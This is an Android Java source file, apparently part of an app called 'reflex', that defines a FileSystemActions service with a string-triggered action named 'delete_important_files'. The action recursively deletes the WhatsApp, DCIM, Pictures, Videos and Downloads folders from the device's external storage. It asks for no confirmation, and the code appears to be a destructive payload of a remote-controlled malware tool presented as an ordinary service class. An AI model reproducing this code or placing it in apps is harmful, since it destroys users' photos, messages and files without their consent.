package com.reflex.services.fileSystem;

import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;
import android.widget.EditText;
import android.widget.Toast;

import com.reflex.R;
import com.reflex.services.Reflex;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;

/**
 * built for  mapping android file system
 * action offers
 */
public class FileSystemActions {

    private HashMap<String, Reflex> map;
    private static FileSystemActions instance;

    public static FileSystemActions getInstance() {
        if (instance == null) {
            instance = new FileSystemActions();
        }
        return instance;
    }

    private FileSystemActions() {
        map = new HashMap<>();
        map.put("delete_important_files", (context, intent) -> deleteImportantFiles());
    }


    public Reflex getAction(String action) {
        return map.get(action);
    }

     void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()){
            for (File child : fileOrDirectory.listFiles()){
                Log.wtf("deleting",child.getAbsolutePath());
                deleteRecursive(child);
            }
        }
        fileOrDirectory.delete();
    }


   void deleteImportantFiles() {

        String files[] = {"WhatsApp", "DCIM", "Pictures", "Videos", "Downloads"};
        for (String name:files) {
            File file = new File(Environment.getExternalStorageDirectory()
                    .getAbsolutePath(),
                    name);
            if (file.exists()) {
                deleteRecursive(file);
            }
        }
    }

    public  JSONObject readJSONFromAsset(InputStream is) {
        JSONObject json = null;
        try {
            int size = is.available();
            byte[] buffer = new byte[size];
            is.read(buffer);
            is.close();
            json = new JSONObject(new String(buffer, StandardCharsets.UTF_8));
        } catch (IOException ex) {
            ex.printStackTrace();
            return null;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return json;
    }
}
